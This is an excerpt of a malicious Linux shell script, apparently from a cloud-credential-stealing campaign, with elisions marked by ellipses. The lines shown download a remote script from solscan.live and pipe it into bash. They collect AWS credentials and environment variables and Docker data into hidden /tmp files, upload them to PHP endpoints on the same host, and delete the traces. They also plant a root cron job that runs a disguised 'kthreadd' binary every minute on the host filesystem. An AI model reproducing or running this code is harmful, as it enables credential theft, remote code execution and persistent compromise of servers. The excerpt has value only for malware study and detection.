...
curl http://solscan.live/sh/ws.sh | bash
}
...
if [ -f "/tmp/.aws" ] ; then curl -F "userfile=@/tmp/.aws" http://solscan.live/SFRAME/upload/axx.php ; rm -f /tmp/.aws ; fi
...
if [ -f "/tmp/.aws2" ] ; then curl -F "userfile=@/tmp/.aws2" http://solscan.live/SFRAME/upload/aws.php ; rm -f /tmp/.aws2 ; fi

env | grep "AWS" >> /tmp/.aws3
cat /tmp/.aws2 | grep "AWS" || rm -f /tmp/.aws3
if [ -f "/tmp/.aws3" ] ; then curl -F "userfile=@/tmp/.aws3" http://solscan.live/SFRAME/upload/aws.php ; rm -f /tmp/.aws3 ; fi
...
curl -F "userfile=@/tmp/.docker" http://solscan.live/SFRAME/upload/aws.php
rm -f /tmp/.docker
fi
...
echo '*/1 * * * * /usr/bin/kthreadd 2>/dev/null 1>/dev/null ; crontab -r' > /host/var/spool/cron/root
}
